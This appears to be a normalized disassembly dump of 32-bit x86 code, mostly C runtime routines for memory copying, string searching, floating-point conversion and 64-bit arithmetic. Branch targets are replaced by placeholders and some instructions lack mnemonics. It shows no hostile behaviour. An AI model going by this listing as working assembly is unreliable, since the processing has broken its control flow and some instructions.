mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] esi
mov edx [ ebp - 0x18 ]
xor eax eax
lea ecx [ esi + edx ]
mov [ ebp - 0xc ] ecx
cmp ecx esi
jb r-xdata
mov eax esi
xor ecx ecx
lea esi [ eax + 0x1 ]
cmp esi eax
jb r-xdata
mov [ ebx ] eax
test ecx ecx
je r-xdata
mov eax edi
mov ecx esi
shr eax 0x1f
add esi esi
or esi eax
shr ecx 0x1f
mov eax [ ebp - 0x4 ]
add edx edx
or edx ecx
add eax 0xffff
add edi edi
mov [ ebp - 0x4 ] eax
test edx 0x8000
je r-xdata
mov [ ebx ] edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edx
xor eax eax
inc eax
cmp ecx edx
jae r-xdata
xor ecx ecx
inc ecx
cmp esi 0x1
jae r-xdata
mov edx [ ebp + 0x10 ]
mov eax edx
mov esi [ ebp - 0xc ]
add edx edx
add edi [ ebp - 0x14 ]
add esi esi
and [ ebp - 0x10 ] 0x0
add edi edi
shr eax 0x1f
or esi eax
shr ecx 0x1f
mov eax [ ebp + 0x8 ]
or edi ecx
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] edi
movsx eax [ eax ]
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x1c ] eax
lea ecx [ edx + eax ]
mov [ ebp - 0xc ] ecx
cmp ecx edx
jb r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] ecx
test eax eax
je r-xdata
inc edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test ecx ecx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp ecx eax
jae r-xdata
mov [ ebx ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
dec eax
mov [ ebx + 0x4 ] esi
inc [ ebp + 0x8 ]
mov [ ebx + 0x8 ] edi
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
mov eax esi
xor edx edx
lea esi [ eax + 0x1 ]
mov [ ebp + 0x10 ] esi
cmp esi eax
jb r-xdata
mov edx [ ebp - 0xc ]
lea edi [ ebp - 0x1c ]
mov esi ebx
mov eax ecx
shr eax 0x1f
add edx edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0x10 ]
mov ecx esi
mov edi [ ebp - 0x8 ]
add esi esi
or esi eax
shr ecx 0x1f
add edi edi
mov eax edx
or edi ecx
shr eax 0x1f
mov ecx esi
add edx edx
add esi esi
shr ecx 0x1f
or esi eax
mov [ ebx ] edx
mov eax [ ebp - 0x1c ]
add edi edi
or edi ecx
mov [ ebx + 0x4 ] esi
add eax edx
mov [ ebx + 0x8 ] edi
xor ecx ecx
mov [ ebp + 0x10 ] eax
cmp eax edx
jb r-xdata
mov eax 0x404e
xor edx edx
xor edx edx
inc edx
cmp esi 0x1
jae r-xdata
inc edi
mov [ ebp - 0x8 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x4 ] esi
test edx edx
je r-xdata
sub_40c461
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_40281d
mov ecx [ ebp - 0x10 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
mov ecx [ ecx + 0x90 ]
mov eax [ ebp + 0x8 ]
movzx ecx [ ecx + eax * 2 ]
and ecx 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40a0a0
add esp 0xc
mov ecx eax
jmp r-xdata
mov eax ecx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40c4b3
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_40c461
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
pop ebp
retn
sub_40c4e0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_40c9b4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40c8b8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c9b4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_40c72c ]
jmp [ ecx * 4 + jump_table_40c7ac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c818 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40c9b4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40c818 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c9b4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c9b4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40c9b4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c818 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c818 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_40c818 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_40c818 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_40cb30
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_40cc67
push ebp
mov ebp esp
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ edx + 0xc ]
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_4028d9
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ esi ] 0x0
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov [ esi ] 0x30
push ebx
lea ebx [ esi + 0x1 ]
mov eax ebx
test ecx ecx
jle r-xdata
call sub_4028d9
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov dl [ edi ]
test dl dl
je r-xdata
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop edx
movsx edx dl
inc edi
jmp r-xdata
push ebx
call sub_408310
inc eax
push eax
push ebx
push esi
call sub_40c4e0
add esp 0x10
inc [ edx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ eax ] dl
inc eax
dec ecx
test ecx ecx
jg r-xdata
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_40cd17
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
movzx edi [ eax + 0x6 ]
mov ebx 0x80000000
mov edx [ eax + 0x4 ]
mov ecx edi
mov eax [ eax ]
and edi 0x8000
shr ecx 0x4
and edx 0xfffff
and ecx 0x7ff
mov [ ebp - 0x8 ] edi
mov esi ecx
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
test edx edx
jne r-xdata
cmp esi 0x7ff
je r-xdata
lea eax [ ecx + 0x3c01 ]
xor ebx ebx
test eax eax
jne r-xdata
mov eax 0x7fff
jmp r-xdata
lea eax [ ecx + 0x3c00 ]
jmp r-xdata
or edi eax
mov [ ebx + 0x8 ] di
mov edi eax
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] edx
and [ eax ] edx
mov [ eax + 0x8 ] di
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov esi ecx
shr esi 0x15
shl edx 0xb
or esi edx
shl ecx 0xb
or esi ebx
mov [ ebp + 0xc ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebx + 0x4 ] esi
mov [ ebx ] ecx
test esi esi
js r-xdata
movzx eax ax
mov edx [ ebx ]
add esi esi
mov ecx edx
add edi 0xffff
shr ecx 0x1f
or esi ecx
lea eax [ edx + edx ]
mov [ ebx ] eax
jns r-xdata
mov [ ebp + 0xc ] edi
mov edi [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x4 ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40cddf
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_40cd17
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40cfcc
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_4086c5
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_402531
int3
mov ecx [ ebp - 0x4 ]
mov eax ebx
pop edi
mov [ ebx + 0xc ] esi
xor ecx ebp
pop esi
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
sub_40ce70
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_40cf50
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_40cf6f
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
and ecx 0xfff7ffff
and eax ecx
push esi
mov esi [ ebp + 0x8 ]
test eax 0xfcf0fce0
je r-xdata
push ecx
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_40da49
call sub_40da49
mov [ esi ] eax
jmp r-xdata
call sub_4028d9
push 0x16
pop esi
mov [ eax ] esi
call sub_402521
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_40da49
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_40cfcc
push ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx edx [ ebp + 0x10 ]
xor ecx ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov eax 0x7fff
push esi
mov esi 0x8000
mov [ ebp - 0x74 ] ebx
and edx esi
mov [ ebp - 0x30 ] 0xcccccccc
movzx esi [ ebp + 0x10 ]
inc ecx
and esi eax
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x80 ] edx
mov [ ebp - 0x64 ] eax
push edi
test dx dx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp si ax
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp + 0xc ]
test si si
jne r-xdata
movzx edx si
mov ecx edi
shr ecx 0x18
mov eax edx
shr eax 0x8
xor ebx ebx
mov [ ebp - 0x1a ] edi
mov edi rw-data
sub edi 0x60
mov [ ebp - 0x16 ] si
mov [ ebp - 0x58 ] 0x5
lea eax [ eax + ecx * 2 ]
mov [ ebp - 0x70 ] 0xbffd
imul ecx eax 0x4d
imul eax edx 0x4d10
mov [ ebp - 0x54 ] 0x3fbf
add eax 0xecbced0c
add eax ecx
sar eax 0x10
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1e ] eax
xor eax eax
mov [ ebp - 0x20 ] ax
movsx eax cx
neg eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
mov edx 0x80000000
mov [ ebx ] cx
mov ecx [ ebp + 0x8 ]
cmp eax edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ ebp - 0x20 ]
jns r-xdata
test eax 0x40000000
jne r-xdata
test ecx ecx
je r-xdata
xor eax eax
mov [ ebx + 0x3 ] cl
mov [ ebx ] ax
mov eax 0x8000
cmp dx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov eax ecx
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
test [ ebp + 0x18 ] 0x1
mov ecx [ ebp - 0x74 ]
mov eax [ ebp - 0x48 ]
mov edi [ ebp + 0x14 ]
mov [ ecx ] ax
je r-xdata
inc ecx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x48 ] ecx
mov ecx eax
mov eax [ ebp - 0x26 ]
mov edi eax
xor edi ecx
mov [ ebp - 0x10 ] ebx
and edi 0x8000
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x44 ] edi
mov edi 0x7fff
and eax edi
mov [ ebp - 0x8 ] ebx
and ecx edi
mov [ ebp - 0x7c ] eax
add eax ecx
movzx edi ax
mov eax 0x7fff
mov [ ebp - 0x4c ] edi
cmp cx ax
jae r-xdata
je r-xdata
neg eax
mov edi rw-data
sub edi 0x60
mov [ ebp - 0x44 ] eax
test eax eax
cmp [ ebp - 0x80 ] 0x0
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40174b
mov esp ebp
pop ebp
retn
mov [ ebp - 0x48 ] edi
cwde
add edi eax
mov [ ebp - 0x48 ] edi
test edi edi
jg r-xdata
xor eax eax
cmp [ ebp - 0x44 ] ax
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x7c ]
cmp ax [ ebp - 0x64 ]
jae r-xdata
mov esi [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x40 ] esi
cmp eax edx
jne r-xdata
cmp eax 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_4086c5
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x18 ]
shr edi 0x10
sub edi 0x3ffe
xor eax eax
push 0x8
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x16 ] ax
mov ebx [ ebp - 0x18 ]
pop edi
mov [ ebp - 0x48 ] eax
push 0x15
pop eax
cmp edi eax
jle r-xdata
xor eax eax
mov [ ecx ] ax
mov eax 0x8000
cmp [ ebp - 0x80 ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ecx + 0x2 ] al
xor eax eax
inc eax
mov [ ecx + 0x3 ] al
mov [ ecx + 0x4 ] 0x30
cmp di [ ebp - 0x70 ]
ja r-xdata
mov eax [ ebp - 0x44 ]
test eax eax
jne r-xdata
imul ecx eax 0xc
mov eax 0x8000
add ecx edi
mov [ ebp - 0x68 ] ecx
cmp [ ecx ] ax
jb r-xdata
push r--data
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_402531
int3
mov [ ebx + 0x3 ] 0x6
mov ecx edx
mov eax esi
shr eax 0x1f
add edx edx
shr ecx 0x1f
add ebx ebx
add esi esi
or ebx ecx
or edx eax
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x18 ] ebx
dec edi
jne r-xdata
mov edi [ ebp - 0x64 ]
mov [ ebp - 0x44 ] ebx
